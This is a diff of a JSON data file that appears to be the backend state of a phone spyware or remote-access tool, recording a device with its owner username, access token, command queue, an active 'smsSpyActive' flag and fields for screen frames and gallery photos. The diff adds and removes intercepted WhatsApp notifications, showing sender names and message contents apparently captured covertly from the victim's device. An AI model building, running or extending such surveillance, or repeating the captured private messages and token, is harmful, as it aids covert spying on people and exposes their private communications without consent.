@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776003617467,
+    "lastSeen": 1776003622457,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -124,6 +124,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎4 pesan baru",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003622829
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
+        "content": "‎3 pesan baru",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003618332
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨 (3 pesan): ~ 你也太八卦了吧 ",
+        "content": "kami berteman",
+        "time": "12/04 21:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776003617911
+      },
       {
         "appName": "WhatsApp",
         "sender": "𝙑𝙞𝙧𝙩𝙪𝙖𝙡 𝙁𝙧𝙞𝙚𝙣𝙙𝙨",
@@ -4099,30 +4123,6 @@
         "time": "12/04 00:21",
         "pkg": "com.whatsapp",
         "receivedAt": 1775928090842
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋: Membalas Anda",
-        "content": "~ sanji (am prem 2k 1 tahun pm!!): ya kalo free gw mati",
-        "time": "12/04 00:21",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775928090754
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋",
-        "content": "~ sanji (am prem 2k 1 tahun pm!!): jmbut",
-        "time": "12/04 00:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775928046988
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𝐀𝐑𝐓𝐇𝐈𝐂𝐀𝐋 𝐌𝐀𝐇𝐀𝐓𝐈𝐑 𝐃𝐋𝐌 𝐊𝐍𝐃𝐀𝐋𝐈 𝐇𝐄𝐊𝐀𝐋: Membalas Anda",
-        "content": "~ sanji (am prem 2k 1 tahun pm!!): jmbut",
-        "time": "12/04 00:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775928046923
       }
     ],
     "galleryPhotos": [],
